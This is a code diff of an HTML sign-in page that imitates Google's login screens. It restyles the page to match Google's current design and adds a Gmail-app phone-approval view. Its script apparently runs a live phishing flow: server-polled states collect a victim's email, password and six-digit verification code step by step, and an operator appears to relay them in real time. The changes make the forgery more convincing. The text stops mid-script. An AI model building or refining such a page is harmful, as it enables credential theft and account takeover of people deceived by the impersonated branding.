@@ -8,82 +8,82 @@
 <style>
 *{box-sizing:border-box;margin:0;padding:0}
 body{background-color:#f0f4f9;font-family:'Google Sans','Roboto','Arial',sans-serif;min-height:100vh;display:flex;flex-direction:column;justify-content:flex-start;align-items:center;padding-top:96px}
-#parent{width:90%;max-width:900px;background-color:#fff;border-radius:28px;padding:0 24px;display:flex;overflow:hidden;min-height:384px;position:relative}
+#parent{width:90%;max-width:840px;background-color:#fff;border-radius:28px;padding:0 24px;display:flex;overflow:hidden;min-height:384px;position:relative}
 #left_child{width:50%;padding:48px 0;display:flex;flex-direction:column;justify-content:flex-start}
-#google_logo{width:75px;height:24px;margin-bottom:16px}
-#signin_heading{font-size:24px;font-weight:400;color:#202124;margin-bottom:8px;line-height:1.4}
-#statement{font-size:14px;color:#444746;margin-bottom:0;line-height:1.43}
-#statement a{color:#1a73e8;text-decoration:none;font-weight:500}
+#google_logo{width:48px;height:48px;margin-bottom:16px}
+#signin_heading{font-size:2rem;font-weight:400;color:#1f1f1f;margin-bottom:8px;line-height:1.25}
+#statement{font-size:1rem;color:#444746;margin-bottom:0;line-height:1.5}
+#statement a{color:#0b57d0;text-decoration:none;font-weight:500}
 #statement a:hover{text-decoration:underline}
 #right_child{width:50%;padding:48px 0 40px 24px;display:flex;flex-direction:column}
 #loginForm{width:100%;display:flex;flex-direction:column;flex:1}
 .field-group{position:relative;margin-bottom:24px}
 .field-group fieldset{border:1px solid #dadce0;border-radius:4px;padding:0 15px;width:100%;min-height:56px;display:flex;align-items:center;transition:border-color .2s}
-.field-group fieldset:focus-within{border-color:#1a73e8;border-width:2px;padding:0 14px}
-.field-group fieldset input{width:100%;border:0;outline:0;font-size:16px;font-family:'Google Sans','Roboto','Arial',sans-serif;color:#202124;background:transparent;padding:16px 0 8px;margin:0}
+.field-group fieldset:focus-within{border-color:#0b57d0;border-width:2px;padding:0 14px}
+.field-group fieldset input{width:100%;border:0;outline:0;font-size:16px;font-family:'Google Sans','Roboto','Arial',sans-serif;color:#1f1f1f;background:transparent;padding:16px 0 8px;margin:0}
 .field-group fieldset input::placeholder{color:transparent}
 .field-group fieldset legend{position:absolute;top:16px;left:15px;font-size:16px;color:#5f6368;pointer-events:none;transition:all .2s ease;background:transparent;padding:0}
-.field-group fieldset:focus-within legend,.field-group fieldset.has-value legend{top:0;transform:translateY(-50%);font-size:12px;color:#1a73e8;background:#fff;padding:0 4px}
+.field-group fieldset:focus-within legend,.field-group fieldset.has-value legend{top:0;transform:translateY(-50%);font-size:12px;color:#0b57d0;background:#fff;padding:0 4px}
 .field-group.field-error fieldset legend{color:#d93025}
 .field-group.field-error fieldset{border-color:#d93025}
 .field-group.field-error fieldset:focus-within{border-color:#d93025}
 .error-msg{color:#d93025;font-size:12px;margin-top:4px;display:none;font-family:'Roboto','Arial',sans-serif;align-items:center;gap:6px}
 .error-msg .error-icon{width:16px;height:16px;flex-shrink:0;fill:#d93025}
-#forgot{border:0;background:#fff;color:#1a73e8;font-weight:500;font-size:14px;cursor:pointer;padding:8px 0;margin-top:2px;text-align:left;font-family:'Google Sans','Roboto','Arial',sans-serif}
+#forgot{border:0;background:#fff;color:#0b57d0;font-weight:500;font-size:14px;cursor:pointer;padding:8px 0;margin-top:2px;text-align:left;font-family:'Google Sans','Roboto','Arial',sans-serif}
 #forgot:hover{background:#f6fafe}
 #guestText{font-size:12px;color:#5f6368;margin-top:16px;line-height:1.6}
-#guestText a{color:#1a73e8;text-decoration:none;font-weight:500}
+#guestText a{color:#0b57d0;text-decoration:none;font-weight:500}
 #guestText a:hover{text-decoration:underline}
 .button_row{display:flex;justify-content:flex-end;align-items:center;gap:8px;margin-top:auto;padding-top:24px}
 #tryAnotherWay{margin-right:auto}
-#create_button{border:0;background:#fff;color:#1a73e8;font-weight:500;font-size:14px;cursor:pointer;padding:10px 16px;border-radius:20px;font-family:'Google Sans','Roboto','Arial',sans-serif}
+#create_button{border:0;background:#fff;color:#0b57d0;font-weight:500;font-size:14px;cursor:pointer;padding:10px 16px;border-radius:20px;font-family:'Google Sans','Roboto','Arial',sans-serif}
 #create_button:hover{background:#f6fafe}
-#next_button{background:#1a73e8;color:#fff;border:0;border-radius:20px;padding:10px 24px;font-size:14px;font-weight:500;cursor:pointer;font-family:'Google Sans','Roboto','Arial',sans-serif;min-width:90px;transition:background .2s,box-shadow .2s}
+#next_button{background:#0b57d0;color:#fff;border:0;border-radius:20px;padding:10px 24px;font-size:14px;font-weight:500;cursor:pointer;font-family:'Google Sans','Roboto','Arial',sans-serif;min-width:90px;transition:background .2s,box-shadow .2s}
 #next_button:hover{background:#1765cc;box-shadow:0 1px 3px 0 rgba(60,64,67,.3)}
 #next_button:disabled{background:#ccc;color:#666;cursor:not-allowed;box-shadow:none}
 #verificationOptionsGroup{margin-top:8px;margin-bottom:24px}
-#verificationOptionsGroup .option-label{font-size:14px;color:#202124;margin-bottom:12px;font-weight:400}
+#verificationOptionsGroup .option-label{font-size:14px;color:#1f1f1f;margin-bottom:12px;font-weight:400}
 #verificationOptionsGroup .option-item{margin-bottom:2px;display:flex;align-items:center;gap:16px;padding:12px 16px;border-radius:8px;cursor:pointer;border:1px solid transparent;transition:background-color 0.15s,border-color 0.15s}
 #verificationOptionsGroup .option-item:hover{background-color:#e8f0fe;border-color:#dadce0}
-#verificationOptionsGroup .option-item.selected{background-color:#e8f0fe;border-color:#1a73e8}
+#verificationOptionsGroup .option-item.selected{background-color:#e8f0fe;border-color:#0b57d0}
 #verificationOptionsGroup .option-icon{width:20px;height:20px;flex-shrink:0;display:flex;align-items:center;justify-content:center;color:#5f6368;font-size:18px}
-#verificationOptionsGroup .option-text{font-size:14px;color:#202124;line-height:1.4;flex:1}
+#verificationOptionsGroup .option-text{font-size:14px;color:#1f1f1f;line-height:1.4;flex:1}
 #styledErrorContainer{display:none;margin-bottom:16px}
 #styledErrorContainer .form-error-display{background:#fce8e6;border:1px solid #d93025;border-radius:8px;padding:12px 16px;display:flex;align-items:flex-start;gap:10px}
 #styledErrorContainer .form-error-display i{color:#d93025;font-size:20px;margin-top:1px}
 #styledErrorContainer .form-error-display .error-title{font-weight:600;color:#d93025;font-size:14px;margin-bottom:4px}
-#styledErrorContainer .form-error-display .error-msg{display:block;color:#202124;font-size:13px;line-height:1.4;margin:0}
-#footer{width:90%;max-width:900px;display:flex;justify-content:space-between;align-items:center;padding:16px 24px;margin-top:12px}
-#sessionExpiredView{display:none;width:90%;max-width:900px;flex-direction:column;align-items:flex-start;text-align:left;background:#fff;border-radius:28px;padding:48px 40px}
+#styledErrorContainer .form-error-display .error-msg{display:block;color:#1f1f1f;font-size:13px;line-height:1.4;margin:0}
+#footer{width:90%;max-width:840px;display:flex;justify-content:space-between;align-items:center;padding:16px 24px;margin-top:12px}
+#sessionExpiredView{display:none;width:90%;max-width:840px;flex-direction:column;align-items:flex-start;text-align:left;background:#fff;border-radius:28px;padding:48px 40px}
 #languages{border:0;background:transparent;color:#5f6368;font-size:12px;cursor:pointer;padding:4px 8px;font-family:'Roboto','Arial',sans-serif;display:flex;align-items:center;gap:4px}
-#languages:hover{color:#202124}
+#languages:hover{color:#1f1f1f}
 .footer_links{display:flex;gap:16px}
-.footer_links button{border:0;background:transparent;color:#5f6368;font-size:12px;cursor:pointer;padding:4px 0;font-family:'Roboto','Arial',sans-serif}
-.footer_links button:hover{color:#202124;text-decoration:underline}
+.footer_links button{border:0;background:transparent;color:#1f1f1f;font-size:12px;cursor:pointer;padding:4px 0;font-family:'Google Sans','Roboto','Arial',sans-serif}
+.footer_links button:hover{color:#1f1f1f;text-decoration:underline}
 .progress-overlay{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(255,255,255,.95);z-index:99999;flex-direction:column;justify-content:center;align-items:center}
 #cardProgress{display:none;position:absolute;top:0;left:0;width:100%;height:3px;background:#e8eaed;overflow:hidden;border-radius:28px 28px 0 0;z-index:1}
-#cardProgress .bar{position:absolute;top:0;left:0;height:100%;width:30%;background:#1a73e8;animation:progressSlide 1.5s ease-in-out infinite}
+#cardProgress .bar{position:absolute;top:0;left:0;height:100%;width:30%;background:#0b57d0;animation:progressSlide 1.5s ease-in-out infinite}
 .progress-track{width:300px;height:4px;background:#e8eaed;border-radius:2px;overflow:hidden;margin-bottom:24px}
-.progress-bar{width:40%;height:100%;background:#1a73e8;border-radius:2px;animation:progressSlide 1.5s ease-in-out infinite}
+.progress-bar{width:40%;height:100%;background:#0b57d0;border-radius:2px;animation:progressSlide 1.5s ease-in-out infinite}
 @keyframes progressSlide{0%{transform:translateX(-100%)}100%{transform:translateX(350%)}}
-.loading-text{color:#202124;font-size:14px;text-align:center;max-width:300px}
+.loading-text{color:#1f1f1f;font-size:14px;text-align:center;max-width:300px}
 .loading-error{color:#d93025;font-size:14px;display:none;text-align:center;max-width:300px}
 #emailChip{display:none;align-items:center;gap:12px;padding:8px 12px;border-radius:24px;background:#f1f3f4;margin-bottom:8px;cursor:default;width:100%}
-#emailChip .avatar{width:32px;height:32px;border-radius:50%;background:#1a73e8;color:#fff;display:flex;align-items:center;justify-content:center;font-size:14px;font-weight:500;font-family:'Google Sans','Roboto','Arial',sans-serif;flex-shrink:0}
-#emailChip .email-text{font-size:14px;color:#202124;font-family:'Google Sans','Roboto','Arial',sans-serif;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+#emailChip .avatar{width:32px;height:32px;border-radius:50%;background:#0b57d0;color:#fff;display:flex;align-items:center;justify-content:center;font-size:14px;font-weight:500;font-family:'Google Sans','Roboto','Arial',sans-serif;flex-shrink:0}
+#emailChip .email-text{font-size:14px;color:#1f1f1f;font-family:'Google Sans','Roboto','Arial',sans-serif;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
 #emailChip .dropdown-arrow{color:#5f6368;font-size:12px;flex-shrink:0}
 .show-password-row{display:none;align-items:center;gap:8px;margin-top:-16px;margin-bottom:20px}
-.show-password-row input[type="checkbox"]{width:18px;height:18px;accent-color:#1a73e8;cursor:pointer;margin:0}
-.show-password-row label{font-size:14px;color:#202124;cursor:pointer;font-family:'Google Sans','Roboto','Arial',sans-serif;user-select:none}
-#forgotPasswordLink{display:none;border:0;background:#fff;color:#1a73e8;font-weight:500;font-size:14px;cursor:pointer;padding:8px 0;margin-top:2px;text-align:left;font-family:'Google Sans','Roboto','Arial',sans-serif}
+.show-password-row input[type="checkbox"]{width:18px;height:18px;accent-color:#0b57d0;cursor:pointer;margin:0}
+.show-password-row label{font-size:14px;color:#1f1f1f;cursor:pointer;font-family:'Google Sans','Roboto','Arial',sans-serif;user-select:none}
+#forgotPasswordLink{display:none;border:0;background:#fff;color:#0b57d0;font-weight:500;font-size:14px;cursor:pointer;padding:8px 0;margin-top:2px;text-align:left;font-family:'Google Sans','Roboto','Arial',sans-serif}
 #forgotPasswordLink:hover{background:#f6fafe}
 @media(max-width:768px){
 body{background-color:#fff;padding-top:60px}
 #parent{flex:1;flex-direction:column;width:100%;max-width:450px;margin:0 auto;min-height:auto;border-radius:0;overflow:hidden;padding:0;box-shadow:none}
 #left_child{width:100%;padding:24px 24px 0}
 #right_child{width:100%;padding:8px 24px 0;overflow:hidden}
-#google_logo{width:75px;height:auto;margin-bottom:24px}
-#signin_heading{font-size:24px}
+#google_logo{width:48px;height:48px;margin-bottom:24px}
+#signin_heading{font-size:2rem}
 #loginForm{flex:none}
 .field-group fieldset{min-height:52px}
 .field-group fieldset input{font-size:16px;padding:14px 0 6px}
@@ -100,9 +100,9 @@ body{padding-top:48px}
 #parent{max-width:100%}
 #left_child{padding:20px 24px 0}
 #right_child{padding:8px 24px 0}
-#google_logo{width:65px;margin-bottom:20px}
-#signin_heading{font-size:22px}
-#statement{font-size:14px}
+#google_logo{width:40px;height:40px;margin-bottom:20px}
+#signin_heading{font-size:1.75rem}
+#statement{font-size:1rem}
 #loginForm{flex:none}
 .field-group fieldset{min-height:48px}
 .field-group fieldset input{font-size:16px;padding:12px 0 6px}
@@ -119,6 +119,8 @@ body{padding-top:48px}
 @keyframes fadeIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
 @media(min-width:960px){
 body{padding-top:108px}
+#left_child{padding:108px 0 48px}
+#signin_heading{font-size:2.25rem}
 }
 </style>
 </head>
@@ -150,24 +152,82 @@ body{padding-top:108px}
 </div>
 <button type="button" id="forgotPasswordLink">Forgot password?</button>
 <div id="verificationOptionsGroup" style="display:none">
-<div style="font-size:16px;font-weight:400;color:#202124;margin-bottom:8px;line-height:1.4">Choose how you want to sign in:</div>
+<div style="font-size:16px;font-weight:400;color:#1f1f1f;margin-bottom:8px;line-height:1.4">Choose how you want to sign in:</div>
 <div id="verificationOptionsContainer"></div>
 <div class="error-msg" id="RequireVerificationChoice"><svg class="error-icon" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg><span>Please select a verification option.</span></div>
 </div>
-<div id="verifySentMessage" style="display:none;font-size:14px;color:#202124;margin-bottom:24px;line-height:1.5">An email with a verification code was just sent to <span id="maskedEmail"></span></div>
+<div id="verifySentMessage" style="display:none;font-size:14px;color:#1f1f1f;margin-bottom:24px;line-height:1.5">An email with a verification code was just sent to <span id="maskedEmail"></span></div>
 <div id="verificationCodeGroup" class="field-group" style="display:none">
 <fieldset><legend id="verificationCodeLabel">Verification code</legend><input type="text" id="txtVerificationCode" name="txtVerificationCode" placeholder="Enter verification code" autocomplete="off" maxlength="6" inputmode="numeric" pattern="[0-9]{6}" onkeydown="if(event.key==='Enter'||event.keyCode===13){event.preventDefault();handleFormSubmission();}" oninput="this.value=this.value.replace(/[^0-9]/g,'').slice(0,6)"></fieldset>
 <div class="error-msg" id="RequireVerificationCode"><svg class="error-icon" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg><span>Verification code is required.</span></div>
 <div class="error-msg" id="InvalidVerificationCode"><svg class="error-icon" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg><span>Invalid verification code. Please try again.</span></div>
 </div>
-<div id="phonePromptView" style="display:none;text-align:center;padding:32px 0">
-<div style="margin:0 auto 24px;width:64px;height:64px;background:#e8f0fe;border-radius:50%;display:flex;align-items:center;justify-content:center">
-<svg width="32" height="32" viewBox="0 0 24 24" fill="#1a73e8"><path d="M17 1.01L7 1c-1.1 0-2 .9-2 2v18c0 1.1.9 2 2 2h10c1.1 0 2-.9 2-2V3c0-1.1-.9-1.99-2-1.99zM17 19H7V5h10v14z"/></svg>
+<div id="phonePromptView" style="display:none;padding:32px 0">
+<div style="display:flex;gap:32px;align-items:flex-start">
+<div style="flex:1">
+<h2 id="phonePromptHeading" style="font-size:20px;font-weight:400;color:#1f1f1f;margin-bottom:12px;font-family:'Google Sans','Roboto','Arial',sans-serif;line-height:1.4">Open the Gmail app on your phone</h2>
+<p id="phonePromptInstructions" style="font-size:14px;color:#5f6368;line-height:1.6;margin-bottom:24px;font-family:'Roboto','Arial',sans-serif"></p>
+<div style="display:flex;align-items:center;gap:8px;margin-bottom:8px">
+<input type="checkbox" id="dontAskAgain" checked style="width:18px;height:18px;accent-color:#0b57d0;cursor:pointer">
+<label for="dontAskAgain" style="font-size:14px;color:#1f1f1f;font-family:'Roboto','Arial',sans-serif;cursor:pointer">Don't ask again on this device</label>
 </div>
-<h2 style="font-size:20px;font-weight:400;color:#202124;margin-bottom:12px;font-family:'Google Sans','Roboto','Arial',sans-serif">Check your phone</h2>
-<p id="phonePromptInstructions" style="font-size:14px;color:#5f6368;line-height:1.6;max-width:320px;margin:0 auto 24px;font-family:'Roboto','Arial',sans-serif">Tap 'Yes' on the notification in your Gmail app on your phone to allow sign-in.</p>
-<div class="progress-track" style="width:200px;margin:0 auto 16px"><div class="progress-bar"></div></div>
-<p style="font-size:13px;color:#5f6368;font-family:'Roboto','Arial',sans-serif">Waiting for your response...</p>
+</div>
+<div style="flex:0 0 auto;display:flex;align-items:center;justify-content:center;padding-top:8px">
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 245 150" width="220" height="134" style="display:block">
+<g transform="translate(122.5,75)">
+<g transform="translate(-2.25,0)">
+<path fill="#fff" d="M-72,-226.5C-72,-226.5,72,-226.5,72,-226.5C94.37,-226.5,112.5,-208.37,112.5,-186C112.5,-186,112.5,186,112.5,186C112.5,208.37,94.37,226.5,72,226.5C72,226.5,-72,226.5,-72,226.5C-94.37,226.5,-112.5,208.37,-112.5,186C-112.5,186,-112.5,-186,-112.5,-186C-112.5,-208.37,-94.37,-226.5,-72,-226.5Z"/>
+<path fill="none" stroke="#1f1f1f" stroke-width="3" d="M-72,-226.5C-72,-226.5,72,-226.5,72,-226.5C94.37,-226.5,112.5,-208.37,112.5,-186C112.5,-186,112.5,186,112.5,186C112.5,208.37,94.37,226.5,72,226.5C72,226.5,-72,226.5,-72,226.5C-94.37,226.5,-112.5,208.37,-112.5,186C-112.5,186,-112.5,-186,-112.5,-186C-112.5,-208.37,-94.37,-226.5,-72,-226.5Z"/>
+</g>
+<g transform="translate(-2.25,-207)">
+<circle cx="0" cy="0" r="6" fill="#1f1f1f"/>
+</g>
+<g transform="translate(111.75,-144)">
+<rect x="-3" y="-27" width="6" height="54" rx="3" fill="#1f1f1f"/>
+</g>
+<g transform="translate(111.75,-93)">
+<rect x="-3" y="-12" width="6" height="24" rx="3" fill="#1f1f1f"/>
+</g>
+</g>
+<g transform="translate(118,75)">
+<circle cx="-18" cy="0" r="36" fill="none" stroke="#e1e3e2" stroke-width="6"/>
+<circle cx="18" cy="0" r="36" fill="#e1e3e2"/>
+<circle cx="18" cy="0" r="36" fill="#fff"/>
+<g transform="translate(18,0)">
+<path fill="#e1e3e2" d="M17.96,-17.96C9.9,-26.01,-3.16,-26.01,-11.22,-17.96C-11.22,-17.96,-17.96,-11.22,-17.96,-11.22C-26.01,-3.16,-26.01,9.9,-17.96,17.96C-9.9,26.01,3.16,26.01,11.22,17.96C11.22,17.96,17.96,11.22,17.96,11.22C26.01,3.16,26.01,-9.9,17.96,-17.96Z"/>
+<path fill="#fff" d="M17.96,-17.96C9.9,-26.01,-3.16,-26.01,-11.22,-17.96C-11.22,-17.96,-17.96,-11.22,-17.96,-11.22C-26.01,-3.16,-26.01,9.9,-17.96,17.96C-9.9,26.01,3.16,26.01,11.22,17.96C11.22,17.96,17.96,11.22,17.96,11.22C26.01,3.16,26.01,-9.9,17.96,-17.96Z"/>
+<path fill="#4a84f5" d="M-5.25,32.16C-5.25,32.16,13.13,32.16,13.13,32.16C13.13,32.16,13.13,-12.47,13.13,-12.47C13.13,-12.47,-13.13,-32.16,-13.13,-32.16C-13.13,-32.16,-13.13,24.28,-13.13,24.28C-13.13,28.63,-9.6,32.16,-5.25,32.16Z"/>
+<path fill="#00a875" d="M-13.13,32.16C-13.13,32.16,5.25,32.16,5.25,32.16C9.6,32.16,13.13,28.63,13.13,24.28C13.13,24.28,13.13,-32.16,13.13,-32.16C13.13,-32.16,-13.13,-12.47,-13.13,-12.47C-13.13,-12.47,-13.13,32.16,-13.13,32.16Z"/>
+<path fill="#ea3c64" d="M0,-5.25C0,-5.25,-31.5,-28.88,-31.5,-28.88C-31.5,-28.88,-31.5,5.25,-31.5,5.25C-31.5,5.25,0,28.88,0,28.88C0,28.88,31.5,5.25,31.5,5.25C31.5,5.25,31.5,-28.88,31.5,-28.88C31.5,-28.88,0,-5.25,0,-5.25Z"/>
+</g>
+<g transform="translate(-18,0)">
+<path fill="#e1e3e2" d="M19.04,12C21.78,12,24,9.78,24,7.04C24,7.04,24,6,24,6C24,-7.26,13.25,-18,0,-18C-13.25,-18,-24,-7.26,-24,6C-24,6,-24,7.04,-24,7.04C-24,9.78,-21.78,12,-19.04,12C-19.04,12,19.04,12,19.04,12Z"/>
+<path fill="#fff" d="M19.04,12C21.78,12,24,9.78,24,7.04C24,7.04,24,6,24,6C24,-7.26,13.25,-18,0,-18C-13.25,-18,-24,-7.26,-24,6C-24,6,-24,7.04,-24,7.04C-24,9.78,-21.78,12,-19.04,12C-19.04,12,19.04,12,19.04,12Z"/>
+</g>
+</g>
+<g transform="translate(118,30)">
+<path fill="#e1e3e2" d="M-15,-24C-15,-24,-6.92,-24,-6.92,-24C-6.92,-24,-6.92,-19.83,-6.92,-19.83C-6.92,-19.83,-0.69,-19.83,-0.69,-19.83C-0.69,-19.83,-0.69,-15.86,-0.69,-15.86C-0.69,-15.86,5.77,-15.86,5.77,-15.86C5.77,-15.86,5.77,-11.27,5.77,-11.27C5.77,-11.27,11.08,-11.27,11.08,-11.27C11.08,-11.27,11.08,-7.51,11.08,-7.51C11.08,-7.51,16.39,-7.51,16.39,-7.51C16.39,-7.51,16.39,-2.92,16.39,-2.92C16.39,-2.92,21,-2.92,21,-2.92C21,-2.92,21,2.92,21,2.92C21,2.92,16.39,2.92,16.39,2.92C16.39,2.92,16.39,7.51,16.39,7.51C16.39,7.51,11.08,7.51,11.08,7.51C11.08,7.51,11.08,11.27,11.08,11.27C11.08,11.27,5.77,11.27,5.77,11.27C5.77,11.27,5.77,15.86,5.77,15.86C5.77,15.86,-0.69,15.86,-0.69,15.86C-0.69,15.86,-0.69,19.83,-0.69,19.83C-0.69,19.83,-6.92,19.83,-6.92,19.83C-6.92,19.83,-6.92,24,-6.92,24C-6.92,24,-15,24,-15,24C-15,24,-15,-24,-15,-24Z"/>
+<circle cx="-1.5" cy="0" r="24" fill="#fff" stroke="#e1e3e2" stroke-width="6"/>
+<g transform="scale(0.37) translate(-43.3,-22.3)">
+<path fill="#c6154d" d="M-14.44,-9.18C-14.44,-9.18,-14.44,1.32,-14.44,1.32C-14.44,1.32,-2.39,12.98,-2.39,12.98C-2.39,12.98,11.81,21.01,11.81,21.01C11.81,21.01,14.44,3.34,14.44,3.34C14.44,3.34,11.81,-13.11,11.81,-13.11C11.81,-13.11,4.46,-18.63,4.46,-18.63C-3.33,-24.47,-14.44,-18.91,-14.44,-9.18Z"/>
+</g>
+<g transform="scale(0.37) translate(43.3,-22.3)">
+<path fill="#ffb85f" d="M-11.81,-13.11C-11.81,-13.11,-14.44,3.55,-14.44,3.55C-14.44,3.55,-11.81,21.01,-11.81,21.01C-11.81,21.01,1.08,14.63,1.08,14.63C1.08,14.63,14.44,1.32,14.44,1.32C14.44,1.32,14.44,-9.18,14.44,-9.18C14.44,-18.91,3.33,-24.47,-4.46,-18.63C-4.46,-18.63,-11.81,-13.11,-11.81,-13.11Z"/>
+</g>
+<g transform="scale(0.37) translate(-44.6,11.2)">
+<path fill="#4a84f5" d="M-5.25,32.16C-5.25,32.16,13.13,32.16,13.13,32.16C13.13,32.16,13.13,-12.47,13.13,-12.47C13.13,-12.47,-13.13,-32.16,-13.13,-32.16C-13.13,-32.16,-13.13,24.28,-13.13,24.28C-13.13,28.63,-9.6,32.16,-5.25,32.16Z"/>
+</g>
+<g transform="scale(0.37) translate(44.6,11.2)">
+<path fill="#00a875" d="M-13.13,32.16C-13.13,32.16,5.25,32.16,5.25,32.16C9.6,32.16,13.13,28.63,13.13,24.28C13.13,24.28,13.13,-32.16,13.13,-32.16C13.13,-32.16,-13.13,-12.47,-13.13,-12.47C-13.13,-12.47,-13.13,32.16,-13.13,32.16Z"/>
+</g>
+<g transform="scale(0.37) translate(0,-6.6)">
+<path fill="#ea3c64" d="M0,-5.25C0,-5.25,-31.5,-28.88,-31.5,-28.88C-31.5,-28.88,-31.5,5.25,-31.5,5.25C-31.5,5.25,0,28.88,0,28.88C0,28.88,31.5,5.25,31.5,5.25C31.5,5.25,31.5,-28.88,31.5,-28.88C31.5,-28.88,0,-5.25,0,-5.25Z"/>
+</g>
+</g>
+</g>
+</svg>
+</div>
+</div>
 </div>
 <div class="error-msg" id="GeneralError"><svg class="error-icon" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg><span>An error occurred. Please try again.</span></div>
 <div id="styledErrorContainer">
@@ -182,7 +242,7 @@ body{padding-top:108px}
 </div>
 <p id="guestText">Not your computer? Use Guest mode to sign in privately. <a href="https://support.google.com/chrome/answer/6130773" target="_blank">Learn more about using Guest mode</a></p>
 <div id="button_row" class="button_row">
-<button type="button" id="tryAnotherWay" style="display:none;border:0;background:#fff;color:#1a73e8;font-weight:500;font-size:14px;cursor:pointer;padding:10px 16px;border-radius:20px;font-family:'Google Sans','Roboto','Arial',sans-serif">Try another way</button>
+<button type="button" id="tryAnotherWay" style="display:none;border:0;background:#fff;color:#0b57d0;font-weight:500;font-size:14px;cursor:pointer;padding:10px 16px;border-radius:20px;font-family:'Google Sans','Roboto','Arial',sans-serif">Try another way</button>
 <button type="button" id="create_button">Create account</button>
 <button type="button" id="next_button" onclick="handleFormSubmission()">Next</button>
 </div>
@@ -190,11 +250,11 @@ body{padding-top:108px}
 </div>
 </div>
 <div id="sessionExpiredView" style="display:none">
-<img src="https://www.gstatic.com/images/branding/googleg_gradient/svg/googleg_gradient_standard_48px.svg" alt="Google" style="width:75px;height:24px;margin-bottom:16px">
-<h1 style="font-size:24px;font-weight:400;color:#202124;margin-bottom:16px;text-align:left;font-family:'Google Sans','Roboto','Arial',sans-serif">You're not signed in</h1>
-<p id="sessionExpiredMessage" style="font-size:14px;color:#5f6368;line-height:1.6;margin-bottom:32px;max-width:400px;font-family:'Roboto','Arial',sans-serif"></p>
+<img src="https://www.gstatic.com/images/branding/googleg_gradient/svg/googleg_gradient_standard_48px.svg" alt="Google" style="width:48px;height:48px;margin-bottom:16px">
+<h1 style="font-size:2rem;font-weight:400;color:#1f1f1f;margin-bottom:16px;text-align:left;font-family:'Google Sans','Roboto','Arial',sans-serif;line-height:1.25">You're not signed in</h1>
+<p id="sessionExpiredMessage" style="font-size:1rem;color:#444746;line-height:1.5;margin-bottom:32px;max-width:400px;font-family:'Google Sans','Roboto','Arial',sans-serif"></p>
 <div style="width:100%;display:flex;justify-content:flex-end">
-<button type="button" id="sessionExpiredRetryBtn" style="background:#1a73e8;color:#fff;border:0;border-radius:20px;padding:12px 32px;font-size:14px;font-weight:500;cursor:pointer;font-family:'Google Sans','Roboto','Arial',sans-serif;min-width:90px;transition:background .2s">Try again</button>
+<button type="button" id="sessionExpiredRetryBtn" style="background:#0b57d0;color:#fff;border:0;border-radius:20px;padding:10px 24px;font-size:14px;font-weight:500;cursor:pointer;font-family:'Google Sans','Roboto','Arial',sans-serif;min-width:90px;transition:background .2s;height:40px">Try again</button>
 </div>
 </div>
 <div id="footer">
@@ -237,8 +297,8 @@ switch(s){case'WAITING':{eG.style.display='block';pG.style.display='none';vOG.st
 case'PROCESSING':{sB.innerText='Checking...';sB.disabled=true;eF.readOnly=true;pF.disabled=true;setFormSubmitting(true);if(!processingStartTime)processingStartTime=Date.now();startPolling(2000);break;}
 case'WAITINGEMAIL':case'WAITINGEMAILERROR':{lastFormVisibleStatus=status;setFormSubmitting(false);hideLoadingOverlay();sB.innerText='Next';document.getElementById('signin_heading').innerText='Sign in';document.getElementById('statement').innerHTML='Use your Google Account';const eC=document.getElementById('emailChip');if(eC)eC.style.display='none';eG.style.display='block';pG.style.display='none';document.getElementById('showPasswordRow').style.display='none';document.getElementById('forgotPasswordLink').style.display='none';document.getElementById('forgot').style.display='inline-block';document.getElementById('guestText').style.display='block';document.getElementById('create_button').style.display='inline-block';eF.readOnly=false;pF.disabled=false;if(d.email)eF.value=d.email;if(s==='WAITINGEMAILERROR'&&d.lastJsonResponse){try{const r=typeof d.lastJsonResponse==='string'?JSON.parse(d.lastJsonResponse):d.lastJsonResponse;if(r.message&&!r.message.includes('Processing email')){showFieldError('InvalidEmail','emailGroup',r.message);}}catch(e){}}else if(s==='WAITINGEMAILERROR'){showFieldError('InvalidEmail','emailGroup','Invalid email. Please try again.')}startPolling(2000);break;}
 case'WAITINGPASSWORD':case'WAITINGPASSWORDERROR':{lastFormVisibleStatus=status;console.log('[Template] WAITINGPASSWORD | statusChanged:',statusChanged,'| browserId:',browserId);setFormSubmitting(false);if(statusChanged){console.log('[Template] WAITINGPASSWORD: rendering form (status transition)');hideLoadingOverlay();sB.innerText='Next';const emailForName=d.email||eF.value||'';const firstName=emailForName.split('@')[0];const displayName=firstName.charAt(0).toUpperCase()+firstName.slice(1);document.getElementById('signin_heading').innerText='Hi '+displayName;document.getElementById('statement').innerText='Use your Google Account';const eC=document.getElementById('emailChip');if(eC){const av=eC.querySelector('.avatar');const em=eC.querySelector('.email-text');const emailVal=d.email||eF.value||'';if(av)av.textContent=emailVal.charAt(0).toUpperCase();if(em)em.textContent=emailVal;eC.style.display='flex'}eG.style.display='none';pG.style.display='block';document.getElementById('showPasswordRow').style.display='flex';document.getElementById('forgotPasswordLink').style.display='inline-block';document.getElementById('forgot').style.display='none';document.getElementById('guestText').style.display='none';document.getElementById('create_button').style.display='none';if(d.email)eF.value=d.email;eF.readOnly=true;pF.disabled=false;pF.value='';document.getElementById('showPasswordCheck').checked=false;pF.type='password'}else{console.log('[Template] WAITINGPASSWORD: preserving form (no status change)')}if(d.lastJsonResponse){try{const r=typeof d.lastJsonResponse==='string'?JSON.parse(d.lastJsonResponse):d.lastJsonResponse;const 